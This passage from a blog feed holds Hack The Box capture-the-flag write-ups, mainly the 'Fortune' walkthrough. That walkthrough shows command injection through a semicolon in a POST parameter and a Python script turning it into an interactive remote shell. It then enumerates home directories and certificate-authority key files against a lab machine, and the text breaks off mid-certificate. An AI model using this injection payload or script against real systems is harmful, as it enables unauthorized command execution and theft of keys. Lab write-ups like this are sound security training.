&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---fortune&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/fortune/&quot;&gt;Hack The Box - Fortune&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---helpline&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/helpline/&quot;&gt;Hack The Box - Helpline&lt;/a&gt;&lt;/h4&gt;
&lt;hr /&gt;</content><author><name></name></author><category term="Windows" /><category term="Web" /><category term="RCE" /><category term="Python" /><category term="Exploit Development" /><category term="smb" /><category term="Cryptography" /><summary type="html">Quick Summary Hey guys today Arkham retired and here’s my write-up about it. This box was a challenging one and I enjoyed it a lot, it had an interesting java deserialization vulnerability which is the best thing about this box. Despite the fact that some parts were annoying, this box was great. It’s a Windows box and its ip is 10.10.10.130, I added it to /etc/hosts as arkham.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC arkham.htb We have http on port 80, 8080 and smb, I checked smb first. SMB Let’s use smbclient to list the shares : ``` root@kali:~/Desktop/HTB/boxes/arkham# smbclient –list //arkham.htb/ -U “” Enter WORKGROUP's password:</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/arkham/0.png" /></entry><entry><title type="html">Hack The Box - Fortune</title><link href="http://localhost:4000/hack-the-box/fortune/" rel="alternate" type="text/html" title="Hack The Box - Fortune" /><published>2019-08-03T00:00:00+02:00</published><updated>2019-08-03T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/fortune</id><content type="html" xml:base="http://localhost:4000/hack-the-box/fortune/">&lt;hr /&gt;

&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
&lt;h4 id=&quot;hey-guys-today-fortune-retired-and-heres-my-write-up-about-it-it-was-a-very-cool-box-and-i-really-liked-it-like-the-last-retired-box-lacasadepapel-it-had-rce-and-client-certificate-generation-to-access-a-restricted-https-service-but-thats-only-for-the-initial-steps-as-this-box-had-a-lot-of-interesting-stuff-its-an-openbsd-box-and-its-ip-is-101010127-i-added-it-to-etchosts-as-fortunehtb-lets-jump-right-in-&quot;&gt;Hey guys today Fortune retired and here’s my write-up about it. It was a very cool box and I really liked it, like the last retired box &lt;a href=&quot;/hack-the-box/lacasadepapel&quot;&gt;LaCasaDePapel&lt;/a&gt; it had &lt;code class=&quot;highlighter-rouge&quot;&gt;RCE&lt;/code&gt; and client certificate generation to access a restricted &lt;code class=&quot;highlighter-rouge&quot;&gt;https&lt;/code&gt; service, but that’s only for the initial steps as this box had a lot of interesting stuff. It’s an OpenBSD box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.127&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;fortune.htb&lt;/code&gt;. Let’s jump right in !&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/fortune/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
&lt;h4 id=&quot;as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-&quot;&gt;As always we will start with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to scan for open ports and services :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC fortune.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/fortune/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-have-http-https-on-port-80-port-443-and-we-have-ssh-on-port-22-so-we-will-be-focusing-on-the-web-services&quot;&gt;We have &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;https&lt;/code&gt; on port 80, port 443 and we have &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; on port 22 so we will be focusing on the web services.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;http-initial-enumeration&quot;&gt;HTTP Initial Enumeration&lt;/h3&gt;
&lt;h4 id=&quot;the-index-page-on-httpfortunehtb-is-pretty-simple-we-have-some-options-where-we-can-choose-a-database-of-fortunes-and-we-will-get-a-random-fortune-from-that-database-&quot;&gt;The index page on &lt;code class=&quot;highlighter-rouge&quot;&gt;http://fortune.htb&lt;/code&gt; is pretty simple, we have some options where we can choose a database of fortunes and we will get a random fortune from that database :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/fortune/2.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/fortune/3.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/fortune/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;on-httpsfortunehtb-we-get-a-handshake-error-this-probably-means-that-we-need-a-client-certificate&quot;&gt;On &lt;code class=&quot;highlighter-rouge&quot;&gt;https://fortune.htb&lt;/code&gt; we get a handshake error, this probably means that we need a client certificate.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/fortune/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;rce-client-certificate-generation&quot;&gt;RCE, Client Certificate Generation&lt;/h3&gt;
&lt;h4 id=&quot;back-to-httpfortunehtb-i-intercepted-the-request-with-burp-and-there-was-only-one-parameter-in-the-post-request-called-db-after-trying-some-different-things-i-could-get-rce-by-appending-a-semi-colon--&quot;&gt;Back to &lt;code class=&quot;highlighter-rouge&quot;&gt;http://fortune.htb&lt;/code&gt; I intercepted the request with burp and there was only one parameter in the POST request called &lt;code class=&quot;highlighter-rouge&quot;&gt;db&lt;/code&gt;, after trying some different things I could get &lt;code class=&quot;highlighter-rouge&quot;&gt;RCE&lt;/code&gt; by appending a semi-colon &lt;code class=&quot;highlighter-rouge&quot;&gt;;&lt;/code&gt; :&lt;/h4&gt;
&lt;h4 id=&quot;request-&quot;&gt;Request :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /select HTTP/1.1
Host: fortune.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://fortune.htb/
Content-Type: application/x-www-form-urlencoded
Content-Length: 7
Connection: close
Upgrade-Insecure-Requests: 1

db=;pwd
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;response-&quot;&gt;Response :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HTTP/1.1 200 OK
Connection: close
Content-Type: text/html; charset=utf-8
Date: Fri, 02 Aug 2019 11:08:49 GMT
Server: OpenBSD httpd
Content-Length: 680

&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;Your fortune&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'viewport'&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'width=device-width, initial-scale=1'&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;http-equiv=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;X-UA-Compatible&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;IE=edge&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;h2&amp;gt;&lt;/span&gt;Your fortune is:&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h2&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;p&amp;gt;&amp;lt;pre&amp;gt;&lt;/span&gt;

Bagbiter:
	1. n.; Equipment or program that fails, usually
intermittently.  2. adj.:  Failing hardware or software.  &lt;span class=&quot;ni&quot;&gt;&amp;amp;#34;&lt;/span&gt;This
bagbiting system won&lt;span class=&quot;ni&quot;&gt;&amp;amp;#39;&lt;/span&gt;t let me get out of spacewar.&lt;span class=&quot;ni&quot;&gt;&amp;amp;#34;&lt;/span&gt;  Usage:  verges on
obscenity.  Grammatically separable; one may speak of &lt;span class=&quot;ni&quot;&gt;&amp;amp;#34;&lt;/span&gt;biting the
bag&lt;span class=&quot;ni&quot;&gt;&amp;amp;#34;&lt;/span&gt;.  Synonyms: LOSER, LOSING, CRETINOUS, BLETCHEROUS, BARFUCIOUS,
CHOMPER, CHOMPING.
/var/appsrv/fortune


&lt;span class=&quot;nt&quot;&gt;&amp;lt;/pre&amp;gt;&amp;lt;p&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;p&amp;gt;&lt;/span&gt;Try &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'/'&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;again&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;!&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-couldnt-get-a-reverse-shell-get-ssh-or-read-the-user-flag-so-we-are-going-to-enumerate-the-box-through-this-rce-for-some-time&quot;&gt;I couldn’t get a reverse shell, get &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; or read the user flag so we are going to enumerate the box through this &lt;code class=&quot;highlighter-rouge&quot;&gt;RCE&lt;/code&gt; for some time.&lt;/h4&gt;
&lt;h4 id=&quot;i-wrote-a-script-to-make-it-easier-&quot;&gt;I wrote a script to make it easier :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/python3&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;YELLOW&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\033&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[93m&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;GREEN&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\033&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[32m&quot;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;post_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;db&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;req&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://10.10.10.127/select&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;req&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;start&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;rce_result&quot;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;end&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;rce_result_end&quot;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;find&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rfind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;end&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;rce&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GREEN&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[?] command : &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;;echo rce_result;{};echo rce_result_end&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;YELLOW&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[*] Result :&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;this-script-takes-the-command-to-execute-then-sends-the-payload-which-is-echo-rce_resultcommandecho-rce_result_end-then-it-searches-through-the-response-and-prints-the-string-between-rce_result-and-rce_result_end-which-is-the-output-of-our-command&quot;&gt;This script takes the command to execute then sends the payload which is &lt;code class=&quot;highlighter-rouge&quot;&gt;;echo rce_result;COMMAND;echo rce_result_end&lt;/code&gt; then it searches through the response and prints the string between &lt;code class=&quot;highlighter-rouge&quot;&gt;rce_result&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;rce_result_end&lt;/code&gt; which is the output of our command.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/fortune/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;there-are-3-users-on-the-box--bob-charlie-and-nfsuser-&quot;&gt;There are 3 users on the box : &lt;code class=&quot;highlighter-rouge&quot;&gt;bob&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;charlie&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;nfsuser&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[?] command : ls -la /home
[*] Result :

total 20
drwxr-xr-x   5 root     wheel    512 Nov  2  2018 .
drwxr-xr-x  13 root     wheel    512 Aug  2 05:47 ..
drwxr-xr-x   5 bob      bob      512 Nov  3  2018 bob
drwxr-x---   3 charlie  charlie  512 Aug  2 06:21 charlie
drwxr-xr-x   2 nfsuser  nfsuser  512 Nov  2  2018 nfsuser
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;in-bobs-home-directory-there-was-a-directory-called-ca-&quot;&gt;In &lt;code class=&quot;highlighter-rouge&quot;&gt;bob&lt;/code&gt;’s home directory there was a directory called &lt;code class=&quot;highlighter-rouge&quot;&gt;ca&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[?] command : ls -la /home/bob
[*] Result :

total 48
drwxr-xr-x  5 bob   bob    512 Nov  3  2018 .
drwxr-xr-x  5 root  wheel  512 Nov  2  2018 ..
-rw-r--r--  1 bob   bob     87 Oct 11  2018 .Xdefaults
-rw-r--r--  1 bob   bob    771 Oct 11  2018 .cshrc
-rw-r--r--  1 bob   bob    101 Oct 11  2018 .cvsrc
-rw-r--r--  1 bob   bob    359 Oct 11  2018 .login
-rw-r--r--  1 bob   bob    175 Oct 11  2018 .mailrc
-rw-r--r--  1 bob   bob    215 Oct 11  2018 .profile
-rw-------  1 bob   bob     13 Nov  3  2018 .psql_history
drwx------  2 bob   bob    512 Nov  2  2018 .ssh
drwxr-xr-x  7 bob   bob    512 Oct 29  2018 ca
drwxr-xr-x  2 bob   bob    512 Nov  2  2018 dba
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-enumerated-that-directory-for-some-time-and-there-was-a-directory-called-intermediate-where-i-found-a-certificate-and-a-key-&quot;&gt;I enumerated that directory for some time and there was a directory called &lt;code class=&quot;highlighter-rouge&quot;&gt;intermediate&lt;/code&gt; where I found a certificate and a key :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[?] command : ls -la /home/bob/ca
[*] Result :

total 56
drwxr-xr-x  7 bob  bob   512 Oct 29  2018 .
drwxr-xr-x  5 bob  bob   512 Nov  3  2018 ..
drwxr-xr-x  2 bob  bob   512 Oct 29  2018 certs
drwxr-xr-x  2 bob  bob   512 Oct 29  2018 crl
-rw-r--r--  1 bob  bob   115 Oct 29  2018 index.txt
-rw-r--r--  1 bob  bob    21 Oct 29  2018 index.txt.attr
-rw-r--r--  1 bob  bob     0 Oct 29  2018 index.txt.old
drwxr-xr-x  7 bob  bob   512 Nov  3  2018 intermediate
drwxr-xr-x  2 bob  bob   512 Oct 29  2018 newcerts
-rw-r--r--  1 bob  bob  4200 Oct 29  2018 openssl.cnf
drwx------  2 bob  bob   512 Oct 29  2018 private
-rw-r--r--  1 bob  bob     5 Oct 29  2018 serial
-rw-r--r--  1 bob  bob     5 Oct 29  2018 serial.old

[?] command : ls -la /home/bob/ca/intermediate
[*] Result :

total 60
drwxr-xr-x  7 bob  bob   512 Nov  3  2018 .
drwxr-xr-x  7 bob  bob   512 Oct 29  2018 ..
drwxr-xr-x  2 bob  bob   512 Nov  3  2018 certs
drwxr-xr-x  2 bob  bob   512 Oct 29  2018 crl
-rw-r--r--  1 bob  bob     5 Oct 29  2018 crlnumber
drwxr-xr-x  2 bob  bob   512 Oct 29  2018 csr
-rw-r--r--  1 bob  bob   107 Oct 29  2018 index.txt
-rw-r--r--  1 bob  bob    21 Oct 29  2018 index.txt.attr
drwxr-xr-x  2 bob  bob   512 Oct 29  2018 newcerts
-rw-r--r--  1 bob  bob  4328 Oct 29  2018 openssl.cnf
drwxr-xr-x  2 bob  bob   512 Oct 29  2018 private
-rw-r--r--  1 bob  bob     5 Oct 29  2018 serial
-rw-r--r--  1 bob  bob     5 Oct 29  2018 serial.old

[?] command : ls -la /home/bob/ca/intermediate/certs
[*] Result :

total 32
drwxr-xr-x  2 bob  bob   512 Nov  3  2018 .
drwxr-xr-x  7 bob  bob   512 Nov  3  2018 ..
-r--r--r--  1 bob  bob  4114 Oct 29  2018 ca-chain.cert.pem
-r--r--r--  1 bob  bob  1996 Oct 29  2018 fortune.htb.cert.pem
-r--r--r--  1 bob  bob  2061 Oct 29  2018 intermediate.cert.pem

[?] command : ls -la /home/bob/ca/intermediate/private
[*] Result :

total 20
drwxr-xr-x  2 bob  bob   512 Oct 29  2018 .
drwxr-xr-x  7 bob  bob   512 Nov  3  2018 ..
-r--------  1 bob  bob  1675 Oct 29  2018 fortune.htb.key.pem
-rw-r--r--  1 bob  bob  3243 Oct 29  2018 intermediate.key.pem

[?] command : cat /home/bob/ca/intermediate/certs/intermediate.cert.pem
[*] Result :

-----BEGIN CERTIFICATE-----                           
MIIFxDCCA6ygAwIBAgICEAAwDQYJKoZIhvcNAQELBQAwbTELMAkGA1UEBhMCQ0Ex
CzAJBgNVBAgMAk9OMRcwFQYDVQQKDA5Gb3J0dW5lIENvIEhUQjEYMBYGA1UEAwwP
Rm9ydHVuZSBSb290IENBMR4wHAYJKoZIhvcNAQkBFg9ib2JAZm9ydHVuZS5odGIw
HhcNMTgxMDMwMDA1NjQzWhcNMjgxMDI3MDA1NjQzWjB1MQswCQYDVQQGEwJDQTEL
MAkGA1UECAwCT04xFzAVBgNVBAoMDkZvcnR1bmUgQ28gSFRCMSAwHgYDVQQDDBdG
b3J0dW5lIEludGVybWVkaWF0ZSBDQTEeMBwGCSqGSIb3DQEJARYPYm9iQGZvcnR1
bmUuaHRiMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAuTGpzUbl4RIy
DuJv8S36vZm96P8FoUgseznDqNOqAEN+qU6NTzZAjOvCAJu7tiJjnvrUxf4SzuLR
QEsU99R6UDBj/rz1dMRq3P/7VdbNC5o2zrd99fN/MDz288Rv7Z24LKWvPoEFWU5D
SpQo+lregWcl4yzTS0hHQjjk/aGPPkLFhT1oW/kbz9205JT1LvR+mqNWbH/0Q92K
7Ns3b2UqEdvD0nm/t7SAphhkGYEtsxyEdiI97sB6jXxlgHzblwFlQaHvh6H7u6rC
m/VGQDFmY3d/zA1TtZ0vuAJ2/EEs0NU6XySL6YmfIsPJdu4NoeEeXofqwQjNf2bs
jgQZrOujLxTBo1L4cFsNvZVwwNscyr+wZM/SybEGB3vBe4e+wvzkT7YD4lqubvXZ
O346jKcnOF/lviF6HmxhUL5pac4XHNYPJhVoKmimYUWi2fJ/1B2PgRrzv/mmlgL7
JOpJNWMUbc8bEf698QziuCXj5R/+Lover058nrvCAnI4I4wUHTGAgOC1J4hbVoYX
EjK1GT+zlnX9+JAqGthxxqQp/YXYk1lgA5xpANJIlxH0gwaTQ4a8HAPBliHnEV0v
XK38+yzRe1/uD3OUWKw+DYD/EmH78QiAr7Yb7K4H1yh5VF9zkLCTN6WYoaSM1Z0T
nb8nv8SUuSwsa/piZvRo7VqzYbDtl8MCAwEAAaNmMGQwHQYDVR0OBBYEFNBS/hId
Md8NPcYbC32/OSwFbZzUMB8GA1UdIwQYMBaAFFOdNrSGE+IcSQJs1UTIogSJ2i5W
MBIGA1UdEwEB/wQIMAYBAf8CAQAwDgYDVR0PAQH/BAQDAgGGMA0GCSqGSIb3DQEB
CwUAA4ICAQAJ0/abFm23OqxhuRPiGr7VfRn8DbsyQ7oVB8zxJsgfgWkXTKuTtJti
